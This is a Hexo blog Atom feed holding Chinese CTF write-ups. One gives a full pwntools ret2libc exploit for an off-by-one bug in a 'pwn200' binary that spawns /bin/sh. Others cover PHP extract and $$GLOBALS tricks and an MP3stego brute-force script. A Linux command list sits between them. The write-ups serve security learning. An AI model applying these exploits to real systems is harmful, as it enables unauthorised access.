<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Righteous</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://pwnable.me/"/>
  <updated>2017-07-24T15:31:05.317Z</updated>
  <id>http://pwnable.me/</id>
  
  <author>
    <name>Righteous</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>off-by-one</title>
    <link href="http://pwnable.me/2017/07/24/off-by-one/"/>
    <id>http://pwnable.me/2017/07/24/off-by-one/</id>
    <published>2017-07-24T15:14:10.000Z</published>
    <updated>2017-07-24T15:31:05.317Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Off-By-One-Error"><a href="#Off-By-One-Error" class="headerlink" title="Off-By-One Error"></a>Off-By-One Error</h1><h2 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h2><p>差一错误（Off-by-one error）是指在计数时由于边界条件判断失误导致结果多一个单位或者少一个单位的错误，例如越界访问数组元素（访问数组最后一个元素的下一个内存单元）。<br>off-by-one错误可能会进一步引发其他错误，甚至是产生安全漏洞。例如对于代码memcpy(dst, src, size)，如果能够通过off-by-one来改写size的值使之大于dst指向的缓冲区的大小，那么调用memcpy时便会进一步引发缓冲区溢出漏洞。</p>
<h2 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h2><figure class="highlight elixir"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">righteous<span class="variable">@ubuntu</span><span class="symbol">:~/Desktop/Saike/lab1</span><span class="variable">$ </span>file pwn20<span class="number">0</span></div><div class="line"><span class="symbol">pwn200:</span> ELF <span class="number">32</span>-bit LSB executable, Intel <span class="number">80386</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib/ld-linux.so.<span class="number">2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">2.6</span>.<span class="number">26</span>, BuildID[sha1]=fc609447c6b0ccfdb9df8b5bf26b50f152fe195<span class="number">0</span>, stripped</div></pre></td></tr></table></figure>
<p>查看pwn为32位ELF文件</p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ checksec</div><div class="line">CANARY    : <span class="type">disabled</span></div><div class="line">FORTIFY   : <span class="type">disabled</span></div><div class="line">NX        : <span class="type">ENABLED</span></div><div class="line">PIE       : <span class="type">disabled</span></div><div class="line">RELRO     : <span class="type">disabled</span></div></pre></td></tr></table></figure>
<p>开启了NX，将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令，所以无法在栈上填充并执行ShellCode，可以采用ROP，且题目提供了libc.so.6这个文件，如果能够实现函数地址泄漏的话，就可以拿到shell。</p>
<a id="more"></a>
<p>IDA PRO载入分析程序基本流程：</p>
<p><img src="/images/off/0.png" alt=""></p>
<p>从伪代码可以看出：</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="number">1.</span> 调用memset将缓冲区v1上的内容清零，缓冲区的长度为<span class="number">0x80</span>字节；</div><div class="line"><span class="number">2.</span> 调用read读取数据到buf缓冲区中，读取的最大长度为nbytes+<span class="number">1</span>（即<span class="number">17</span>）字节；</div><div class="line"><span class="number">3.</span> 通过if来判断输入数据的合法性，即长度最多为<span class="number">10</span>且前面<span class="number">8</span>个字节的内容必须是syclover；</div><div class="line"><span class="number">4.</span> 调用read读取nbytes字节的数据到缓冲区v1中；</div><div class="line"><span class="number">5.</span> 调用write将缓冲区v1的内容写到标准输出流；</div></pre></td></tr></table></figure>
<p>栈上的数据分布示意图如下所示：<br><img src="/images/off/1.png" alt=""></p>
<p>buf的位置为ebp-0x1C，nbytes的位置为ebp-0x0C，二者之间的差距为0x10，即16字节。</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="title">read</span><span class="params">(<span class="number">0</span>, &amp;buf, nbytes + <span class="number">1</span>)</span></span></div></pre></td></tr></table></figure>
<p>这里指定read最多可以读取17字节的内容，也就是说这里存在缓冲区溢出，通过read读取17字节的内容，就可以改写nbytes本身的值。</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="title">read</span><span class="params">(<span class="number">0</span>, &amp;buf, nbytes + <span class="number">1</span>)</span></span></div></pre></td></tr></table></figure>
<p>可以改写nbytes最低位的一个字节的内容，例如可以将nbytes改写为0xFF。</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="title">read</span><span class="params">(<span class="number">0</span>, &amp;v1, nbytes)</span></span></div></pre></td></tr></table></figure>
<p>一旦我们可以控制nbytes，我们就可以控制read读取的内容的长度，而缓冲区v1的大小只有0x80字节，我们是可以通过缓冲溢出改写函数的返回地址。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> ( <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;buf) - <span class="number">1</span> &lt;= <span class="number">9</span> &amp;&amp; !<span class="built_in">strncmp</span>(<span class="string">"syclover"</span>, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;buf, <span class="number">8u</span>) )</div></pre></td></tr></table></figure>
<p>该if判断很容易绕过，让buf的数据以syclover\0开头即可，因为read可以读取\0，而strlen以\0作为字符串结束符且strncmp指定了比较的长度为8。</p>
<p>v1的起始地址为ebp-0x9C，填充0x9C+4=0xA0=160字节的数据即可覆盖函数的返回地址，如下图所示：<br><img src="/images/off/2.png" alt=""></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>利用分两个阶段：<br>第一阶段通过缓冲区溢出泄漏write函数的地址之后，我们让EIP再次跳转到sub_80484AC函数来执行，这样就可以接着进行第二阶段的缓冲区溢出过程，此时通过改写函数返回地址来执行system(“/bin/sh”)，即可获取到服务器的控制权限。</p>
<p>第一阶段栈上的数据：<br><img src="/images/off/3.jpg" alt=""></p>
<p>注： write函数的原型为ssize_t write(int fd, const void *buf, size_t nbytes)，其中第一个参数fd指明输出句柄，这里采用标准输出流stdout（值为1）；第二个参数是输出缓冲区的地址，这里填充为write函数的GOT地址；第三个参数为输出数据的字节数，因为地址占用4字节，所以填充为4即可。</p>
<p>第二阶段栈上的数据：<br><img src="/images/off/4.jpg" alt=""></p>
<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context.log_level = <span class="string">'debug'</span></div><div class="line">DEBUG = <span class="number">1</span></div><div class="line">target = <span class="string">"./pwn200"</span></div><div class="line"><span class="keyword">if</span> DEBUG:</div><div class="line">	p = process(target)</div><div class="line">        libc=ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</div><div class="line">        elf = ELF(target)</div><div class="line"><span class="keyword">else</span>:</div><div class="line">	p = remote(<span class="string">"127.0.0.1"</span>,<span class="number">10001</span>)</div><div class="line">        libc=ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</div><div class="line">        elf = ELF(target)</div><div class="line"></div><div class="line">write_plt = elf.symbols[<span class="string">'write'</span>] </div><div class="line">log.info(<span class="string">'write_plt:'</span> + hex(write_plt))</div><div class="line">write_got = elf.got[<span class="string">'write'</span>]</div><div class="line">log.info(<span class="string">'write_got:'</span> + hex(write_got))</div><div class="line">vulner_func = <span class="number">0x080484AC</span></div><div class="line">name = <span class="string">"syclover"</span></div><div class="line">payload1 = name + <span class="string">'\x00'</span>*(<span class="number">16</span>-len(name)) + <span class="string">'\xFF'</span></div><div class="line">p.recvuntil(<span class="string">':'</span>)</div><div class="line">p.send(payload1)</div><div class="line">payload2 = <span class="string">'\x00'</span>*<span class="number">160</span> + p32(write_plt) + p32(vulner_func) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</div><div class="line">p.recvuntil(<span class="string">':\x00'</span>)</div><div class="line">p.sendline(payload2)</div><div class="line">write_addr = u32(p.recvn(<span class="number">4</span>)) </div><div class="line">p.recvuntil(<span class="string">':'</span>)</div><div class="line">p.send(payload1)</div><div class="line">system_addr = write_addr - (libc.symbols[<span class="string">'write'</span>] - libc.symbols[<span class="string">'system'</span>]) </div><div class="line">binsh_addr = write_addr - (libc.symbols[<span class="string">'write'</span>] - next(libc.search(<span class="string">'/bin/sh'</span>))) </div><div class="line">payload3 = <span class="string">'\x00'</span>*<span class="number">160</span>  + p32(system_addr) + p32(vulner_func) + p32(binsh_addr) </div><div class="line">p.recvuntil(<span class="string">':'</span>)</div><div class="line">p.send(payload3) </div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
<p>获取到shell：<br><img src="/images/off/5.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Off-By-One-Error&quot;&gt;&lt;a href=&quot;#Off-By-One-Error&quot; class=&quot;headerlink&quot; title=&quot;Off-By-One Error&quot;&gt;&lt;/a&gt;Off-By-One Error&lt;/h1&gt;&lt;h2 id=&quot;相关知识&quot;&gt;&lt;a href=&quot;#相关知识&quot; class=&quot;headerlink&quot; title=&quot;相关知识&quot;&gt;&lt;/a&gt;相关知识&lt;/h2&gt;&lt;p&gt;差一错误（Off-by-one error）是指在计数时由于边界条件判断失误导致结果多一个单位或者少一个单位的错误，例如越界访问数组元素（访问数组最后一个元素的下一个内存单元）。&lt;br&gt;off-by-one错误可能会进一步引发其他错误，甚至是产生安全漏洞。例如对于代码memcpy(dst, src, size)，如果能够通过off-by-one来改写size的值使之大于dst指向的缓冲区的大小，那么调用memcpy时便会进一步引发缓冲区溢出漏洞。&lt;/p&gt;
&lt;h2 id=&quot;逆向分析&quot;&gt;&lt;a href=&quot;#逆向分析&quot; class=&quot;headerlink&quot; title=&quot;逆向分析&quot;&gt;&lt;/a&gt;逆向分析&lt;/h2&gt;&lt;figure class=&quot;highlight elixir&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;righteous&lt;span class=&quot;variable&quot;&gt;@ubuntu&lt;/span&gt;&lt;span class=&quot;symbol&quot;&gt;:~/Desktop/Saike/lab1&lt;/span&gt;&lt;span class=&quot;variable&quot;&gt;$ &lt;/span&gt;file pwn20&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;symbol&quot;&gt;pwn200:&lt;/span&gt; ELF &lt;span class=&quot;number&quot;&gt;32&lt;/span&gt;-bit LSB executable, Intel &lt;span class=&quot;number&quot;&gt;80386&lt;/span&gt;, version &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; (SYSV), dynamically linked, interpreter /lib/ld-linux.so.&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;, &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; GNU/Linux &lt;span class=&quot;number&quot;&gt;2.6&lt;/span&gt;.&lt;span class=&quot;number&quot;&gt;26&lt;/span&gt;, BuildID[sha1]=fc609447c6b0ccfdb9df8b5bf26b50f152fe195&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, stripped&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;查看pwn为32位ELF文件&lt;/p&gt;
&lt;figure class=&quot;highlight ada&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;gdb-peda$ checksec&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;CANARY    : &lt;span class=&quot;type&quot;&gt;disabled&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;FORTIFY   : &lt;span class=&quot;type&quot;&gt;disabled&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;NX        : &lt;span class=&quot;type&quot;&gt;ENABLED&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;PIE       : &lt;span class=&quot;type&quot;&gt;disabled&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;RELRO     : &lt;span class=&quot;type&quot;&gt;disabled&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;开启了NX，将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令，所以无法在栈上填充并执行ShellCode，可以采用ROP，且题目提供了libc.so.6这个文件，如果能够实现函数地址泄漏的话，就可以拿到shell。&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="http://pwnable.me/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Linux</title>
    <link href="http://pwnable.me/2017/06/01/Linux/"/>
    <id>http://pwnable.me/2017/06/01/Linux/</id>
    <published>2017-06-01T05:47:39.000Z</published>
    <updated>2017-06-04T05:57:23.874Z</updated>
    
    <content type="html"><![CDATA[<h1 id="帮助"><a href="#帮助" class="headerlink" title="帮助"></a>帮助</h1><pre><code>man #获取相关命令的帮助信息
info #获取相关命令的详细使用方法
</code></pre><a id="more"></a>
<h1 id="文件管理"><a href="#文件管理" class="headerlink" title="文件管理"></a>文件管理</h1><h2 id="基本文件操作"><a href="#基本文件操作" class="headerlink" title="基本文件操作"></a>基本文件操作</h2><p><strong>增</strong></p>
<pre><code>touch file #创建文件
</code></pre><p><strong>删</strong></p>
<pre><code>rm option file
-r 即recursive，递归删除
-f 即force，强制删除
</code></pre><h2 id="修"><a href="#修" class="headerlink" title="修"></a>修</h2><p><strong>修改位置</strong></p>
<pre><code>mv
</code></pre><p><strong>修改权限</strong></p>
<pre><code>ln
</code></pre><p><strong>修改文件所属者以及文件所属用户组</strong></p>
<pre><code>chown
</code></pre><p><strong>修改属性</strong></p>
<pre><code>chmod
</code></pre><h2 id="查"><a href="#查" class="headerlink" title="查"></a>查</h2><p><strong>查看文件类型</strong></p>
<pre><code>file
</code></pre><p><strong>查看内容</strong></p>
<pre><code>ls
cat
more #在终端屏幕上按帧显示文件
less #按页显示文件
head #显示文件的前几行
tail #显示之地你个文件的最后部分
strings
</code></pre><p><strong>查找位置</strong></p>
<pre><code>whereis
locate
find
</code></pre><p><strong>查找内容</strong></p>
<pre><code>grep #安给定模式搜索文件内容
</code></pre><p><strong>查看区别</strong></p>
<pre><code>diff #查看两个文本文件的区别，列出行不同之处
</code></pre><p><strong>查其他</strong></p>
<pre><code>wc #显示指定文件的行数，词数或字符数
</code></pre><h2 id="其他基本操作"><a href="#其他基本操作" class="headerlink" title="其他基本操作"></a>其他基本操作</h2><p><strong>备份与恢复</strong></p>
<pre><code>cp
cpio
dump #备份文件系统
restore #还原由dump所备份下来的文件或者整个文件系统
</code></pre><p><strong>压缩解压缩</strong></p>
<pre><code>gzip/gunzip #.gz文件的压缩/解压缩程序
gzexe #压缩可执行文件
tar #将若干文件存档或读取存档文件
unarj #解压缩.arj文件
zip/unzip #压缩解压缩zip文件
zipinfo #列出zip压缩文件的详细信息
bzip2/bunzip2 #压缩解压缩.bz2文件
</code></pre><h2 id="杂"><a href="#杂" class="headerlink" title="杂"></a>杂</h2><pre><code>dd #从指定文件读取数据写到指定文件
ln # 建立文件链接
sort # 对指定文件按行进行排序
tr # 转换字符
</code></pre><h2 id="可执行文件操作"><a href="#可执行文件操作" class="headerlink" title="可执行文件操作"></a>可执行文件操作</h2><p><strong>链接</strong></p>
<pre><code>ldd file #查看可执行文件连接了哪些动态链接库
</code></pre><p><strong>符号表</strong></p>
<pre><code>nm file #查看可执行文件里有哪些符号
strip #去除可执行文件里的符号表，减小文件体积
</code></pre><p><strong>文件基本结构</strong></p>
<pre><code>readelf
</code></pre><p><strong>反汇编</strong></p>
<pre><code>objdump
</code></pre><p><strong>进程管理</strong></p>
<pre><code># 进程查看
ps -ef # 查看所有进程的详细信息
# 杀死进程
kill
# 显示管理执行中的程序
top
</code></pre><h2 id="用户"><a href="#用户" class="headerlink" title="用户"></a>用户</h2><p><strong>查看用户信息</strong></p>
<pre><code># 查看用户标识
id
# 显示目前注册的用户以及用户正运行的命令
w
# 列出当前用户登录的信息
last
# 查看系统用户
rhwo
# 查找并显示用户信息
finger
</code></pre><p><strong>修改用户信息</strong></p>
<pre><code># 添加用户
useradd
# 删除用户
userdel
# 修改密码
passwd
userinfo #图形界面的修改工具
usermod #修改用户属性，包括用户的shell类型，用户组等，甚至还能改登录名
</code></pre><p><strong>修改用户权限</strong></p>
<pre><code>su
</code></pre><p><strong>用户登录</strong></p>
<pre><code># 远程登入
rlogin
# 退出系统
logout
</code></pre><h2 id="网络管理"><a href="#网络管理" class="headerlink" title="网络管理"></a>网络管理</h2><p><strong>基本网络信息</strong></p>
<pre><code>ifconfig
#防火墙相关
iptables -L #查看防火墙设置
arp
#路由信息
route -n #查看路由表
#查看与某主机是否联通
ping
#查看到某一个主机的路由路径
traceroute
#查看计算机名
hostname
#查看主机标识
hostid
#显示网络连接、路由表和网络接口信息
netstat -lntp #查看所有监听的端口
netstat -antp #查看所有已经建立的链接
netstat -s #查看网络统计信息
</code></pre><p><strong>文件传输</strong></p>
<pre><code>#文件传输
ftp
#文件传输
lftp
#文件传输
ncftp
</code></pre><p><strong>网络浏览与下载</strong></p>
<pre><code>#从网络自动下载文件
wget
curl
</code></pre><p><strong>邮件管理</strong></p>
<pre><code>#发送和接收电子邮件
mail
</code></pre><p><strong>远程通信</strong></p>
<pre><code>telnet
nc
#安全模式下的远程登录
ssh
</code></pre><p><strong>用户通信</strong></p>
<pre><code>#与主机另一用户通话
talk
#向其他用户的终端写信息
write
</code></pre><h2 id="磁盘管理"><a href="#磁盘管理" class="headerlink" title="磁盘管理"></a>磁盘管理</h2><p><strong>磁盘查看</strong></p>
<pre><code># 当前工作目录
pwd
# 查看当前目录
ls
# 树状列出当前目录
tree
# 目录或文件大小
du
# 磁盘相关信息
df -h # 查看各分区使用情况
# 磁盘已使用空间及限制
quota
</code></pre><p><strong>磁盘操作</strong></p>
<pre><code># 目录切换
cd
# 目录创建
mkdir
# 对磁盘进行分区
fdisk -l # 查看所有分区
# 挂载或者卸载文件系统
mount/umount
# 将内存缓冲区内的数据写入磁盘
sync
</code></pre><h2 id="系统管理"><a href="#系统管理" class="headerlink" title="系统管理"></a>系统管理</h2><p><strong>基本操作</strong></p>
<pre><code># 显示系统信息
uname -a # 查看系统内核、操作系统、CPU信息
# 显示开机信息
dmesg
# 关机
shutdown
# 重启
reboot
# 退出当前shell
exit
</code></pre><p><strong>环境变量</strong></p>
<pre><code># 设置或者显示环境变量
export
import
# 查看环境变量
env
</code></pre><p><strong>指令</strong></p>
<pre><code># 设置指令的别名
alias
</code></pre><p><strong>时间</strong></p>
<pre><code># 调整RTC的时间
clock
# 设置或者显示系统的时间和日期
date
</code></pre><p><strong>内存</strong></p>
<pre><code># 显示内存状态
free -m # 按单位为M查看内存和交换区状态，默认单位为字节
</code></pre><h2 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h2><p><strong>模块</strong></p>
<pre><code># 显示已载入系统的模块
lsmod
# 自动处理可载入的模块
modprobe
</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;帮助&quot;&gt;&lt;a href=&quot;#帮助&quot; class=&quot;headerlink&quot; title=&quot;帮助&quot;&gt;&lt;/a&gt;帮助&lt;/h1&gt;&lt;pre&gt;&lt;code&gt;man #获取相关命令的帮助信息
info #获取相关命令的详细使用方法
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
    
      <category term="Linux" scheme="http://pwnable.me/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>SDCTF</title>
    <link href="http://pwnable.me/2017/04/08/SDCTF/"/>
    <id>http://pwnable.me/2017/04/08/SDCTF/</id>
    <published>2017-04-08T05:31:48.000Z</published>
    <updated>2017-06-04T05:47:28.153Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="web100"><a href="#web100" class="headerlink" title="web100"></a>web100</h2><p> 查看源码，发现extract函数，提交覆盖</p>
<pre><code>SDPC ==&gt;aaaaa&lt;br&gt;password ==&gt;sdpcsdpcsdpc&lt;br&gt;&lt;!--
 if ($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot;) {?&gt;
     extract($_POST);
 if ($SDPC == $password) { 
     echo $key;
--&gt;
</code></pre><a id="more"></a>
<p><img src="/images/sdctf/1.png" alt=""></p>
<p>Flag:SDCTF{244fcba2093a5c942ee11f0f3f28f21f}</p>
<h2 id="web300"><a href="#web300" class="headerlink" title="web300"></a>web300</h2><p> 发现.git,访问发现aaa.php</p>
<p><img src="/images/sdctf/2.png" alt=""></p>
<pre><code>if (isset($_GET[&apos;a&apos;]) and isset($_GET[&apos;b&apos;])) { 
   if ($_GET[&apos;a&apos;] != $_GET[&apos;b&apos;]) 
      if (md5($_GET[&apos;a&apos;]) === md5($_GET[&apos;b&apos;])) 
         die(&apos;Flag: &apos;.$flag); 
      else 
         print &apos;Wrong.&apos;; }
</code></pre><p><img src="/images/sdctf/3.png" alt=""><br>Flag: SDCTF{44224d27bfe875886f4b7247e16e48f8}</p>
<h2 id="web400"><a href="#web400" class="headerlink" title="web400"></a>web400</h2><p>打开题目我们直接就看到源码，加上注释如下</p>
<pre><code>&lt;?php
$SDPC = @$_REQUEST[&apos;hello&apos;];     //$SDPC这个变量请求变量hello的值
if(!preg_match(&apos;/^\w*$/&apos;,$SDPC )){ //正则表达式，匹配字符串，\w表示字符+数字+下划线，*代表有若干个\w字符  组成。
die(&apos;ERROR&apos;);//不匹配则输出ERROR
}
eval(&quot;var_dump($$SDPC);&quot;);       //如果匹配输出\$\$SDPC的值
</code></pre><p>而且通过题目链接可以知道hello变量一定是6位的，一开始真以为是爆破了，但是一想肯定很大，不可能。而且我们发现 $$a 这个东西很诡异。其实就是PHP中变量可以当作另一个变量的变量名。例如</p>
<pre><code>&lt;?php
 $a=&apos;b&apos;;
 $b=&quot;hello world!&quot;;
 eval(&quot;var_dump($$a);&quot;);
?&gt;
</code></pre><p>上面代码会输出hello world!<br>PHP一个比较有意思的变量!$GLOBALS：一个包含了全部变量的全局组合数组。变量的名字就是数组的键。<br>于是我们在url上构造/?hello=GLOBALS<br><img src="/images/sdctf/4.png" alt=""><br>Flag:SDCTF{f60eeabd0af6a908512983d844c00523}</p>
<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Misc200"><a href="#Misc200" class="headerlink" title="Misc200"></a>Misc200</h2><p>通过即得flag<br><img src="/images/sdctf/5.png" alt=""><br>修改存档</p>
<p><img src="/images/sdctf/6.png" alt=""></p>
<p><img src="/images/sdctf/7.png" alt=""></p>
<h2 id="Mice200-Combine"><a href="#Mice200-Combine" class="headerlink" title="Mice200(Combine)"></a>Mice200(Combine)</h2><p>将下载的zip文件进行解压，里面有32个小文件，每个文件中是一个数字，给人感觉就是这个是ASCII值。将所有文件中的文本按照1，10，11，12……的顺序合并到一个文件中：</p>
<pre><code>cat crypto2/* &gt; 1.txt
</code></pre><p>然后转换成对应字符串:</p>
<p><img src="/images/sdctf/8.png" alt=""> </p>
<p>Flag:SDCTF{c5d3effc5u7bedw217e7ndPecf60b5}</p>
<h2 id="Misc300"><a href="#Misc300" class="headerlink" title="Misc300"></a>Misc300</h2><p>rar爆破(pass:0522)，得到1.jpg，steghide隐写，解之得到FLAG.txt</p>
<p><img src="/images/sdctf/9.png" alt=""></p>
<p>Flag:SDCTF{25861b2471456810bea272fd666a8b79}</p>
<h2 id="Misc500-MP3stego"><a href="#Misc500-MP3stego" class="headerlink" title="Misc500(MP3stego)"></a>Misc500(MP3stego)</h2><p>根据RGB生成二维码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</div><div class="line"></div><div class="line">x = <span class="number">280</span></div><div class="line">y = <span class="number">280</span></div><div class="line"></div><div class="line">f = open(<span class="string">"QR.txt"</span>,<span class="string">'r'</span>)</div><div class="line">rgbinfo = f.readlines()</div><div class="line">f.close()</div><div class="line">c = Image.new(<span class="string">"RGB"</span>,(x,y))</div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,x):</div><div class="line">   <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,y):</div><div class="line">      rgb = rgbinfo[i * y + j].split(<span class="string">","</span>)</div><div class="line">      c.putpixel([i, j],(int(rgb[<span class="number">0</span>]), int(rgb[<span class="number">1</span>]),int(rgb[<span class="number">2</span>])))</div><div class="line">c.show()</div></pre></td></tr></table></figure>
<p>得到：MP3stego的密码在1000-1300之间。</p>
<p>生成字典</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">f =<span class="built_in">open</span>(<span class="string">'pwd.txt'</span>,<span class="string">'a'</span>)</div><div class="line"><span class="built_in">line</span> = <span class="string">''</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1000</span>,<span class="number">1300</span>):</div><div class="line">  f.<span class="built_in">write</span>(<span class="built_in">line</span>+str(i)+<span class="string">'\n'</span>)</div><div class="line">f.<span class="built_in">close</span>()</div></pre></td></tr></table></figure>
<p>循环爆破</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> subprocess</div><div class="line"><span class="keyword">for</span> a <span class="keyword">in</span> open(<span class="string">'pwd.txt'</span>):</div><div class="line">   command=<span class="string">'decode -X -P %s mp3.mp3'</span> % a.strip()</div><div class="line">   <span class="keyword">print</span> command</div><div class="line">   p=subprocess.Popen(command,stdin=subprocess.PIPE,</div><div class="line">   stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=<span class="keyword">True</span>)</div><div class="line">   <span class="keyword">if</span> <span class="string">"unexpected end of cipher message."</span><span class="keyword">not</span> <span class="keyword">in</span> p.communicate()[<span class="number">1</span>]:</div><div class="line">	  <span class="keyword">print</span> <span class="string">'[&gt;]password is find:%s'</span> %a.strip()</div><div class="line">	  <span class="keyword">print</span> command</div><div class="line">	  flag = open(<span class="string">'mp3.mp3.txt'</span>)</div><div class="line">	  <span class="keyword">print</span> flag.read()</div><div class="line">	  <span class="keyword">break</span></div></pre></td></tr></table></figure>
<p><img src="/images/sdctf/10.png" alt=""><br>Flag:flag{Brute_f0Rce_iS_W0nderful}</p>
